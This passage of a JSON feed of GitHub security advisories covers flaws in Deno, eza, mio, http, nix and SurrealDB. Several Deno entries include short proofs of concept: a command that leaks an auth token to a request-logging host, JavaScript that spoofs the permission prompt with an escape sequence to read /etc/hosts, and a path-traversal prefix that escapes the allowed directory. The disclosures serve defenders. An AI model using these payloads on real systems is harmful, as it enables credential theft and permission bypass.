            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Deno improperly checks that an import specifier's hostname is equal to or a child of a token's hostname, which can cause tokens to be sent to servers they shouldn't be sent to. An auth token intended for <code>example.com</code> may be sent to <code>notexample.com</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89\">auth_tokens.rs uses a simple ends_with check</a>, which matches <code>www.deno.land</code> to a <code>deno.land</code> token as intended, but also matches <code>im-in-ur-servers-attacking-ur-deno.land</code> to <code>deno.land</code> tokens.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Set up a server that logs requests. RequestBin will do. For example, <code>denovulnpoc.example.com</code>.</li>\n<li>Run <code>DENO_AUTH_TOKENS=a1b2c3d4e5f6@left-truncated.domain deno run https://not-a-left-truncated.domain</code>. For example, <code>DENO_AUTH_TOKENS=a1b2c3d4e5f6@poc.example.com deno run https://denovulnpoc.example.com</code></li>\n<li>Observe that the token intended only for the truncated domain is sent to the full domain</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nAnyone who uses DENO_AUTH_TOKENS and imports potentially untrusted code is affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-5frw-4rwq-xhcr\">https://github.com/denoland/deno/security/advisories/GHSA-5frw-4rwq-xhcr</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/de23e3b60b066481cc390f459497d5bef42a899b\">https://github.com/denoland/deno/commit/de23e3b60b066481cc390f459497d5bef42a899b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5frw-4rwq-xhcr\">https://github.com/advisories/GHSA-5frw-4rwq-xhcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5frw-4rwq-xhcr",
            "title": "[deno] Deno's improper suffix match testing for DENO_AUTH_TOKENS",
            "date_modified": "2024-03-06T17:03:38.000Z",
            "date_published": "2024-03-06T17:03:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5frw-4rwq-xhcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-3qx3-6hxr-j2ch. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Buffer Overflow vulnerability in eza before version 0.18.2, allows local attackers to execute arbitrary code via the .git/HEAD, .git/refs, and .git/objects components.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-25817\">https://nvd.nist.gov/vuln/detail/CVE-2024-25817</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3qx3-6hxr-j2ch\">https://github.com/advisories/GHSA-3qx3-6hxr-j2ch</a></li>\n<li><a href=\"https://www.cubeyond.net/blog/my-cves/eza-cve-report\">https://www.cubeyond.net/blog/my-cves/eza-cve-report</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3xc6-7h59-j2x4\">https://github.com/advisories/GHSA-3xc6-7h59-j2x4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3xc6-7h59-j2x4",
            "title": "[eza] Duplicate Advisory: eza Potential Heap Overflow Vulnerability for AArch64",
            "date_modified": "2024-03-06T15:34:12.000Z",
            "date_published": "2024-03-06T00:31:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3xc6-7h59-j2x4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A maliciously crafted permission request can show the spoofed permission prompt by inserting a broken ANSI escape sequence into the request contents.</p>\n<h3 id=\"details\">Details</h3>\n<p>In <a href=\"https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d\">the patch for CVE-2023-28446</a>, Deno is stripping any ANSI escape sequences from the permission prompt, but permissions given to the program are based on the contents that contain the ANSI escape sequences.</p>\n<p>For example, requesting the read permission with <code>/tmp/hello\\u001b[/../../etc/hosts</code> as a path will display the <code>/tmp/hellotc/hosts</code> in the permission prompt, but the actual permission given to the program is <code>/tmp/hello\\u001b[/../../etc/hosts</code>, which is <code>/etc/hosts</code> after the normalization.</p>\n<p>This difference allows a malicious Deno program to spoof the contents of the permission prompt.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run the following JavaScript and observe that <code>/tmp/hellotc/hosts</code> is displayed in the permission prompt instead of <code>/etc/hosts</code>, although Deno gives access to <code>/etc/hosts</code>.</p>\n<pre><code class=\"language-javascript\">const permission = { name: \"read\", path: \"/tmp/hello\\u001b[/../../etc/hosts\" };\nawait Deno.permissions.request(permission);\nconsole.log(await Deno.readTextFile(\"/etc/hosts\"));\n</code></pre>\n<h4 id=\"expected-prompt\">Expected prompt</h4>\n<pre><code>┌ ⚠️  Deno requests read access to \"/etc/hosts\".\n├ Requested by `Deno.permissions.query()` API\n├ Run again with --allow-read to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all read permissions) &gt;\n</code></pre>\n<h4 id=\"actual-prompt\">Actual prompt</h4>\n<pre><code>┌ ⚠️  Deno requests read access to \"/tmp/hellotc/hosts\".\n├ Requested by `Deno.permissions.query()` API\n├ Run again with --allow-read to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all read permissions) &gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any Deno program can spoof the content of the interactive permission prompt by inserting a broken ANSI code, which allows a malicious Deno program to display the wrong file path or program name to the user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-m4pq-fv2w-6hrw\">https://github.com/denoland/deno/security/advisories/GHSA-m4pq-fv2w-6hrw</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d\">https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/7e6b94231290020b55f1d08fb03ea8132781abc5\">https://github.com/denoland/deno/commit/7e6b94231290020b55f1d08fb03ea8132781abc5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m4pq-fv2w-6hrw\">https://github.com/advisories/GHSA-m4pq-fv2w-6hrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m4pq-fv2w-6hrw",
            "title": "[deno_runtime] Deno's deno_runtime vulnerable to interactive permission prompt spoofing via improper ANSI stripping",
            "date_modified": "2024-03-05T20:54:15.000Z",
            "date_published": "2024-03-05T20:54:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m4pq-fv2w-6hrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A vulnerability in Deno's Node.js compatibility runtime allows for cross-session data contamination during simultaneous asynchronous reads from Node.js streams sourced from sockets or files. The issue arises from the re-use of a global buffer (BUF) in stream_wrap.ts used as a performance optimization to limit allocations during these asynchronous read operations. This can lead to data intended for one session being received by another session, potentially resulting in data corruption and unexpected behavior.</p>\n<h3 id=\"details\">Details</h3>\n<p>A bug in Deno's Node.js compatibility runtime results in data cross-reception during simultaneous asynchronous reads from Node.js network streams. When multiple independent network socket connections are involved, this vulnerability can be triggered. For instance, two separate server sockets that receive data from their respective client sockets and then echo the received data back to the client using Node.js streams may experience an issue where data from one socket may appear on another socket. Due to the improper isolation of the global buffer (<code>BUF</code>), data sent by one socket can end up being incorrectly received by another socket. Consequently, data intended for one session may be exposed to another session, potentially leading to data corruption and unexpected behavior.</p>\n<p>This buffer was introduced as a performance optimization to avoid excessive allocations during network read operations.</p>\n<p>In cases where the <a href=\"https://nodejs.org/api/net.html\">net.Stream</a> is connected to a remote server such as a database or key/value store such as Redis, this may result in a packet received on one connection being presented to another, causing data cross-contamination between multiple users and potentially leaking sensitive information.</p>\n<p>It is important to note that this vulnerability does not affect Deno network streams created with the <code>Deno.listen</code> and <code>Deno.connect</code> APIs. </p>\n<p>The impact of this issue may extend beyond node.js network streams, however, and may also affect asynchronous reads from non-network node.js Stream such as those created from files.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/denoland/deno/issues/20188\">https://github.com/denoland/deno/issues/20188</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This affects all users of Deno that use the node.js compatibility layer for network communication or other streams, including packages that may require node.js libraries indirectly.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-wrqv-pf6j-mqjp\">https://github.com/denoland/deno/security/advisories/GHSA-wrqv-pf6j-mqjp</a></li>\n<li><a href=\"https://github.com/denoland/deno/issues/20188\">https://github.com/denoland/deno/issues/20188</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/3e9fb8aafd9834ebacd27734cea4310caaf794c6\">https://github.com/denoland/deno/commit/3e9fb8aafd9834ebacd27734cea4310caaf794c6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wrqv-pf6j-mqjp\">https://github.com/advisories/GHSA-wrqv-pf6j-mqjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wrqv-pf6j-mqjp",
            "title": "[deno] Deno's Node.js Compatibility Runtime has Cross-Session Data Contamination",
            "date_modified": "2024-03-05T20:49:14.000Z",
            "date_published": "2024-03-05T20:49:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wrqv-pf6j-mqjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Insufficient validation of parameters in <code>Deno.makeTemp*</code> APIs would allow for creation of files outside of the allowed directories. This may allow the user to overwrite important files on the system that may affect other systems.</p>\n<p>A user may provide a prefix or suffix to a <code>Deno.makeTemp*</code> API containing path traversal characters. The permission check would prompt for the base directory of the API, but the final file that was created would be outside of this directory:</p>\n<pre><code>$ mkdir /tmp/good\n$ mkdir /tmp/bad\n$ deno repl --allow-write=/tmp/good\n&gt; Deno.makeTempFileSync({ dir: \"/tmp/bad\" })\n┌ ⚠️  Deno requests write access to \"/tmp/bad\".\n├ Requested by `Deno.makeTempFile()` API.\n├ Run again with --allow-write to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all write permissions) &gt; n\n❌ Denied write access to \"/tmp/bad\".\nUncaught PermissionDenied: Requires write access to \"/tmp/bad\", run again with the --allow-write flag\n    at Object.makeTempFileSync (ext:deno_fs/30_fs.js:176:10)\n    at &lt;anonymous&gt;:1:27\n&gt; Deno.makeTempFileSync({ dir: \"/tmp/good\", prefix: \"../bad/\" })\n\"/tmp/good/../bad/a9432ef5\"\n$ ls -l /tmp/bad/a9432ef5\n-rw-------@ 1 user  group  0 Mar  4 09:20 /tmp/bad/a9432ef5\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>This is fixed in Deno 1.41.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-hrqr-jv8w-v9jh\">https://github.com/denoland/deno/security/advisories/GHSA-hrqr-jv8w-v9jh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27931\">https://nvd.nist.gov/vuln/detail/CVE-2024-27931</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hrqr-jv8w-v9jh\">https://github.com/advisories/GHSA-hrqr-jv8w-v9jh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hrqr-jv8w-v9jh",
            "title": "[deno] Insufficient permission checking in `Deno.makeTemp*` APIs",
            "date_modified": "2024-03-05T20:30:05.000Z",
            "date_published": "2024-03-05T16:19:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hrqr-jv8w-v9jh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using named pipes on Windows, mio will under some circumstances return invalid tokens that correspond to named pipes that have already been deregistered from the mio registry. The impact of this vulnerability depends on how mio is used. For some applications, invalid tokens may be ignored or cause a warning or a crash. On the other hand, for applications that store pointers in the tokens, this vulnerability may result in a use-after-free.</p>\n<p>For users of Tokio, this vulnerability is serious and can result in a use-after-free in Tokio.</p>\n<p>The vulnerability is Windows-specific, and can only happen if you are using named pipes. Other IO resources are not affected.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>This vulnerability has been fixed in mio v0.8.11.</p>\n<p>All versions of mio between v0.7.2 and v0.8.10 are vulnerable.</p>\n<p>Tokio is vulnerable when you are using a vulnerable version of mio AND you are using at least Tokio v1.30.0. Versions of Tokio prior to v1.30.0 will ignore invalid tokens, so they are not vulnerable.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Vulnerable libraries that use mio can work around this issue by detecting and ignoring invalid tokens.</p>\n<h3 id=\"technical-details\">Technical details</h3>\n<p>When an IO resource registered with mio has a readiness event, mio delivers that readiness event to the user using a user-specified token. Mio guarantees that when an IO resource is <a href=\"https://docs.rs/mio/latest/mio/struct.Registry.html#method.deregister\">deregistered</a>, then it will never return the token for that IO resource again. However, for named pipes on windows, mio may sometimes deliver the token for a named pipe even though the named pipe has been previously deregistered.</p>\n<p>This vulnerability was originally reported in the Tokio issue tracker: <a href=\"https://github.com/tokio-rs/tokio/issues/6369\">tokio-rs/tokio#6369</a>\nThis vulnerability was fixed in: <a href=\"https://github.com/tokio-rs/mio/pull/1760\">tokio-rs/mio#1760</a>\nThis vulnerability is also known as <a href=\"https://rustsec.org/advisories/RUSTSEC-2024-0019.html\">RUSTSEC-2024-0019</a>.</p>\n<p>Thank you to @rofoun and @radekvit for discovering and reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tokio-rs/mio/security/advisories/GHSA-r8w9-5wcg-vfj7\">https://github.com/tokio-rs/mio/security/advisories/GHSA-r8w9-5wcg-vfj7</a></li>\n<li><a href=\"https://github.com/tokio-rs/tokio/issues/6369\">https://github.com/tokio-rs/tokio/issues/6369</a></li>\n<li><a href=\"https://github.com/tokio-rs/mio/pull/1760\">https://github.com/tokio-rs/mio/pull/1760</a></li>\n<li><a href=\"https://github.com/tokio-rs/mio/commit/90d4fe00df870acd3d38f3dc4face9aacab8fbb9\">https://github.com/tokio-rs/mio/commit/90d4fe00df870acd3d38f3dc4face9aacab8fbb9</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27308\">https://nvd.nist.gov/vuln/detail/CVE-2024-27308</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8w9-5wcg-vfj7\">https://github.com/advisories/GHSA-r8w9-5wcg-vfj7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8w9-5wcg-vfj7",
            "title": "[mio] Mio's tokens for named pipes may be delivered after deregistration",
            "date_modified": "2024-03-06T21:37:37.000Z",
            "date_published": "2024-03-04T20:44:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8w9-5wcg-vfj7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"duplicate-advisory\">Duplicate Advisory</h3>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-x7vr-c387-8w57. This link is maintained to preserve external references.</p>\n<h3 id=\"original-description\">Original Description</h3>\n<p>HeaderMap::reserve() used usize::next_power_of_two() to calculate the increased capacity. However, next_power_of_two() silently overflows to 0 if given a sufficiently large number in release mode.</p>\n<p>If the map was not empty when the overflow happens, the library will invoke self.grow(0) and start infinite probing. This allows an attacker who controls the argument to reserve() to cause a potential denial of service (DoS).</p>\n<p>The flaw was corrected in 0.1.20 release of http crate.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-25008\">https://nvd.nist.gov/vuln/detail/CVE-2019-25008</a></li>\n<li><a href=\"https://github.com/hyperium/http/issues/352\">https://github.com/hyperium/http/issues/352</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2019-0033.html\">https://rustsec.org/advisories/RUSTSEC-2019-0033.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvc9-xwgj-4cq9\">https://github.com/advisories/GHSA-xvc9-xwgj-4cq9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xvc9-xwgj-4cq9",
            "title": "[http] Duplicate Advisory: Integer Overflow in HeaderMap::reserve() can cause Denial of Service",
            "date_modified": "2024-02-21T19:50:56.000Z",
            "date_published": "2022-06-16T23:08:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xvc9-xwgj-4cq9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>On certain platforms, if a user has more than 16 groups, the nix::unistd::getgrouplist function will call the libc getgrouplist function with a length parameter greater than the size of the buffer it provides, resulting in an out-of-bounds write and memory corruption.</p>\n<p>The libc getgrouplist function takes an in/out parameter ngroups specifying the size of the group buffer. When the buffer is too small to hold all of the requested user's group memberships, some libc implementations, including glibc and Solaris libc, will modify ngroups to indicate the actual number of groups for the user, in addition to returning an error. The version of nix::unistd::getgrouplist in nix 0.16.0 and up will resize the buffer to twice its size, but will not read or modify the ngroups variable. Thus, if the user has more than twice as many groups as the initial buffer size of 8, the next call to getgrouplist will then write past the end of the buffer.</p>\n<p>The issue would require editing /etc/groups to exploit, which is usually only editable by the root user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-45707\">https://nvd.nist.gov/vuln/detail/CVE-2021-45707</a></li>\n<li><a href=\"https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md\">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2021-0119.html\">https://rustsec.org/advisories/RUSTSEC-2021-0119.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wgrg-5h56-jg27\">https://github.com/advisories/GHSA-wgrg-5h56-jg27</a></li>\n<li><a href=\"https://github.com/nix-rust/nix/issues/1541\">https://github.com/nix-rust/nix/issues/1541</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76w9-p8mg-j927\">https://github.com/advisories/GHSA-76w9-p8mg-j927</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76w9-p8mg-j927",
            "title": "[nix] Out-of-bounds Write in nix",
            "date_modified": "2024-02-21T19:15:13.000Z",
            "date_published": "2022-01-06T22:07:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76w9-p8mg-j927"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>On certain platforms, if a user has more than 16 groups, the nix::unistd::getgrouplist function will call the libc getgrouplist function with a length parameter greater than the size of the buffer it provides, resulting in an out-of-bounds write and memory corruption.</p>\n<p>The libc getgrouplist function takes an in/out parameter ngroups specifying the size of the group buffer. When the buffer is too small to hold all of the requested user's group memberships, some libc implementations, including glibc and Solaris libc, will modify ngroups to indicate the actual number of groups for the user, in addition to returning an error. The version of nix::unistd::getgrouplist in nix 0.16.0 and up will resize the buffer to twice its size, but will not read or modify the ngroups variable. Thus, if the user has more than twice as many groups as the initial buffer size of 8, the next call to getgrouplist will then write past the end of the buffer.</p>\n<p>The issue would require editing /etc/groups to exploit, which is usually only editable by the root user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-45707\">https://nvd.nist.gov/vuln/detail/CVE-2021-45707</a></li>\n<li><a href=\"https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md\">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2021-0119.html\">https://rustsec.org/advisories/RUSTSEC-2021-0119.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wgrg-5h56-jg27\">https://github.com/advisories/GHSA-wgrg-5h56-jg27</a></li>\n<li><a href=\"https://github.com/nix-rust/nix/issues/1541\">https://github.com/nix-rust/nix/issues/1541</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76w9-p8mg-j927\">https://github.com/advisories/GHSA-76w9-p8mg-j927</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76w9-p8mg-j927",
            "title": "[nix] Out-of-bounds Write in nix",
            "date_modified": "2024-02-21T19:15:13.000Z",
            "date_published": "2022-01-06T22:07:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76w9-p8mg-j927"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>On certain platforms, if a user has more than 16 groups, the nix::unistd::getgrouplist function will call the libc getgrouplist function with a length parameter greater than the size of the buffer it provides, resulting in an out-of-bounds write and memory corruption.</p>\n<p>The libc getgrouplist function takes an in/out parameter ngroups specifying the size of the group buffer. When the buffer is too small to hold all of the requested user's group memberships, some libc implementations, including glibc and Solaris libc, will modify ngroups to indicate the actual number of groups for the user, in addition to returning an error. The version of nix::unistd::getgrouplist in nix 0.16.0 and up will resize the buffer to twice its size, but will not read or modify the ngroups variable. Thus, if the user has more than twice as many groups as the initial buffer size of 8, the next call to getgrouplist will then write past the end of the buffer.</p>\n<p>The issue would require editing /etc/groups to exploit, which is usually only editable by the root user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-45707\">https://nvd.nist.gov/vuln/detail/CVE-2021-45707</a></li>\n<li><a href=\"https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md\">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2021-0119.html\">https://rustsec.org/advisories/RUSTSEC-2021-0119.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wgrg-5h56-jg27\">https://github.com/advisories/GHSA-wgrg-5h56-jg27</a></li>\n<li><a href=\"https://github.com/nix-rust/nix/issues/1541\">https://github.com/nix-rust/nix/issues/1541</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76w9-p8mg-j927\">https://github.com/advisories/GHSA-76w9-p8mg-j927</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76w9-p8mg-j927",
            "title": "[nix] Out-of-bounds Write in nix",
            "date_modified": "2024-02-21T19:15:13.000Z",
            "date_published": "2022-01-06T22:07:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76w9-p8mg-j927"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>rquickjs</code> crate used by SurrealDB implements Rust bindings to the QuickJS C library and is used to execute SurrealDB scripting functions. The <code>rquickjs</code> function <code>Exception::throw_type</code> takes a string and returns an error object. Prior to version <code>0.4.2</code> of the crate, this string would be fed directly into <code>printf</code>, which will receive the error string as a format string with no additional arguments, leading to undefined behavior. This issue triggers when a SurrealDB scripting function returns an error and its input contains a format string such as <code>%s</code> or <code>%d</code>. </p>\n<p>This vulnerability can only affect SurrealDB servers explicitly enabling the scripting capability with <code>--allow-scripting</code> or <code>--allow-all</code> and equivalent environment variables <code>SURREAL_CAPS_ALLOW_SCRIPT=true</code> and <code>SURREAL_CAPS_ALLOW_ALL=true</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker with privileges to execute scripting functions with arbitrary inputs may be able to exploit this format string vulnerability in order read arbitrary memory from the remote SurrealDB process. A format string vulnerability may also be further exploited to execute arbitrary code with the privileges of the SurrealDB process.</p>\n<p>The fact that error messages are limited to 256 bytes coupled with <a href=\"https://doc.rust-lang.org/rustc/exploit-mitigations.html#exploit-mitigations-1\">exploit mitigation features supported in Rust executables</a> may somewhat increase the complexity of exploiting this vulnerability to reliably achieve remote code execution in practice.</p>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>Version 1.1.1 and later are not affected by this issue.</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Users unable to update should restrict access from untrusted users to define and execute scripting functions. This can be achieved by removing the scripting capability by default or with <code>--deny-scripting</code> and equivalent environment variable <code>SURREAL_CAPS_DENY_SCRIPT=true</code>. If not possible, network access should be limited to trusted users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/surrealdb/surrealdb/issues/3327\">https://github.com/surrealdb/surrealdb/issues/3327</a></li>\n<li><a href=\"https://github.com/surrealdb/surrealdb/pull/3332\">https://github.com/surrealdb/surrealdb/pull/3332</a></li>\n<li><a href=\"https://github.com/DelSkayn/rquickjs/pull/247\">https://github.com/DelSkayn/rquickjs/pull/247</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/surrealdb/surrealdb/security/advisories/GHSA-q3gg-m8hr-h4x4\">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-q3gg-m8hr-h4x4</a></li>\n<li><a href=\"https://github.com/surrealdb/surrealdb/issues/3327\">https://github.com/surrealdb/surrealdb/issues/3327</a></li>\n<li><a href=\"https://github.com/surrealdb/surrealdb/pull/3332\">https://github.com/surrealdb/surrealdb/pull/3332</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q3gg-m8hr-h4x4\">https://github.com/advisories/GHSA-q3gg-m8hr-h4x4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q3gg-m8hr-h4x4",
            "title": "[surrealdb] Externally Controlled Format String in Scripting Functions",
            "date_modified": "2024-02-21T00:04:06.000Z",
            "date_published": "2024-02-21T00:04:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q3gg-m8hr-h4x4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The query executor would panic when executing a query containing a call to a built-in SurrealDB function that did not exist. This could occur accidentally in situations where the version of the SurrealDB client was newer than the SurrealDB server or when a pre-parsed query was provided to the server via a newer version of the SurrealDB SDK.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A client that is authorized to run queries in a SurrealDB server is able to craft and execute a pre-parsed query invoking a nonexistent built-in function, which will cause a panic. This will crash the server, leading to denial of service.</p>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>Version 1.2.0 and later are not affected by this issue.</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Concerned users unable to update may want to limit the ability of untrusted users to run arbitrary SurrealQL queries in the affected versions of SurrealDB. To limit the impact of the denial of service, SurrealDB administrators may also want to ensure that the SurrealDB process is running so that it can be automatically re-started after a crash.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>#3454</li>\n<li><a href=\"https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=65755\">https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=65755</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6wr5-jmpr-mjcx\">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6wr5-jmpr-mjcx</a></li>\n<li><a href=\"https://github.com/surrealdb/surrealdb/pull/3454\">https://github.com/surrealdb/surrealdb/pull/3454</a></li>\n<li><a href=\"https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=65755\">https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=65755</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6wr5-jmpr-mjcx\">https://github.com/advisories/GHSA-6wr5-jmpr-mjcx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6wr5-jmpr-mjcx",
            "title": "[surrealdb] Uncaught Exception in Macro Expecting Native Function to Exist",
            "date_modified": "2024-02-21T00:03:07.000Z",
            "date_published": "2024-02-21T00:03:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6wr5-jmpr-mjcx"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}